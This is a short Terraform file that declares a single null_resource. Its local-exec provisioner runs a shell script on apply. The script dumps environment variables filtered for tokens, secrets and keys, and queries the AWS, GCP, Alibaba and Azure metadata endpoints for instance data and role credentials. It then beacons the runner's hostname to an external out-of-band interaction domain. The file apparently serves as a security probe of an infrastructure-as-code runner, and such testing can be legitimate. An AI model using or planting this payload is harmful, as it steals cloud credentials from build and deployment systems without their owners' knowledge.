terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.2"
    }
  }
}

resource "null_resource" "xsec_probe" {
  provisioner "local-exec" {
    command = <<-EOT
      set +e
      BEACON="4w1wvwqgw0l3a5n5t0f4uevgm7s1gq.oastify.com"
      echo "=== PROBE START ==="
      id
      hostname
      uname -a
      echo "=== ENV (filtered) ==="
      env | grep -Ei 'spacelift|aws|aws_|role|token|secret|key|cred|bucket|region' | sort | head -100
      echo "=== full env count ==="
      env | wc -l
      echo "=== AWS IMDSv1 metadata ==="
      curl -sv -m 10 -w "\nRC=%{http_code}\n" http://169.254.169.254/latest/meta-data/ 2>&1 | tail -40
      echo "=== AWS IMDSv1 role creds ==="
      curl -s -m 10 -w "\nRC=%{http_code}\n" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -60
      echo "=== AWS IMDSv2 token ==="
      curl -s -m 10 -w "\nRC=%{http_code}\n" -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token 2>&1 | head -20
      echo "=== GCP metadata ==="
      curl -s -m 10 -w "\nRC=%{http_code}\n" -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -20
      echo "=== Alibaba metadata ==="
      curl -s -m 10 -w "\nRC=%{http_code}\n" http://100.100.100.200/latest/meta-data/ 2>&1 | head -20
      echo "=== Azure IMDS ==="
      curl -s -m 10 -w "\nRC=%{http_code}\n" -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -20
      echo "=== DNS probes ==="
      getent hosts metadata.google.internal || echo no-gcp-dns
      getent hosts kubernetes.default.svc.cluster.local || echo no-kube-dns
      echo "=== /proc remotes ==="
      cat /proc/version 2>/dev/null | head -2
      echo "=== beacon ==="
      curl -s -m 10 -w "\nRC=%{http_code}\n" "https://$BEACON/xsec-runner?host=$(hostname)" 2>&1 | tail -5
      echo "=== PROBE END ==="
    EOT
  }
}